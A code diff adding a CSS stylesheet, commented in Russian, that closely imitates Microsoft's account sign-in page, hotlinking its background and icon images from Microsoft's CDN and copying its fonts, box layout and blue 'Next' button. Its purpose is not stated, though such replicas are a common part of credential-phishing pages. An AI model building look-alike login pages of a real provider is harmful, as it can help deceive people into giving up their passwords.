@@ -1,0 +1,136 @@
+body {
+    background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg');
+    background-repeat: no-repeat;
+    background-size: cover;
+    background-position: center center;
+    background-attachment: fixed;
+
+    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math", serif;
+    margin: 0; /* Убираем отступы по умолчанию */
+    height: 100vh; /* Высота body равна высоте окна браузера */
+}
+
+main#app {
+    display: flex;
+    flex-direction: column; /* Располагаем элементы по вертикали */
+    align-items: center;
+    min-height: 100vh;
+    justify-content: center;
+}
+
+.sign-in-box {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 10px;
+    max-width: 440px;
+    width: 100%;
+    padding: 44px;
+    background-color: #fff;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+    min-width: 320px;
+    min-height: 338px;
+    overflow: hidden;
+    margin: 0; /* Убираем внешние отступы */
+}
+.sing-in-title{
+    font-size: 1.5rem;
+    font-weight: 600;
+    color: #1b1b1b;
+    line-height: 1.75rem;
+    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+}
+
+/* Новые стили для sign-in-options */
+.sign-in-options {
+    display: flex;
+    margin: 20px auto 0 auto; /* Отступ сверху и центрирование */
+    max-width: 440px;
+    width: calc(100% - 40px);
+    background-color: #fff;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+    min-width: 320px;
+    cursor:pointer;
+    height: 48px;
+    padding:  8px 44px 8px 44px;
+}
+
+.sign-in-options > div {
+    display: flex;
+    align-items: center;
+}
+
+.sign-in-options-image {
+    width: 32px;
+    height: 32px;
+    background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg');
+    background-size: cover;
+    margin-right: 10px;
+}
+
+.sign-in-options-text {
+    font-size: .9375rem;
+    line-height: 1.25rem;
+    font-weight: 400;
+
+}
+
+* {
+    box-sizing: border-box;
+}
+/* Общие стили для всех кнопок */
+.btn, button, input[type='button'], input[type='submit'], input[type='reset'] {
+    margin-top: 0;
+    margin-bottom: 0;
+    min-height: 32px;
+    min-width: 108px;
+    padding: 4px 12px;
+    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", sans-serif;
+    font-size: 0.9375rem; /* 15px */
+    line-height: 1.25rem; /* 20px */
+    font-weight: 600; /* Жирный текст */
+    cursor: pointer; /* Указатель при наведении */
+    transition: background-color 0.3s ease, border-color 0.3s ease; /* Плавные переходы */
+    display: inline-flex; /* Позволяет центрировать содержимое */
+    align-items: center; /* Центрирование по вертикали */
+    justify-content: center; /* Центрирование по горизонтали */
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    touch-action: manipulation;
+    color: #fff; /* Белый текст по умолчанию */
+    background-color: #0067b8; /* Фирменный синий цвет */
+    border: 2px solid #0067b8; /* Синяя граница */
+}
+.button-container {
+    display: flex;
+    justify-content: flex-end;
+    width: 100%;
+}
+
+
+
+/* Специфичные стили для кнопки "Next" */
+.ms-button {
+    width: auto; /* Ширина 100% контейнера */
+}
+
+/* Состояние при наведении */
+.ms-button:hover {
+    background-color: #005A9E; /* Затемнённый синий */
+    border-color: #005A9E; /* Затемнённая граница */
+}
+
+/* Состояние при фокусе */
+.ms-button:focus {
+    outline: 2px solid #005A9E; /* Контур при фокусе */
+    outline-offset: 2px;
+}
+
+/* Состояние при нажатии */
+.ms-button:active {
+    background-color: #004578; /* Ещё более затемнённый синий */
+    border-color: #004578; /* Ещё более затемнённая граница */
+}
+
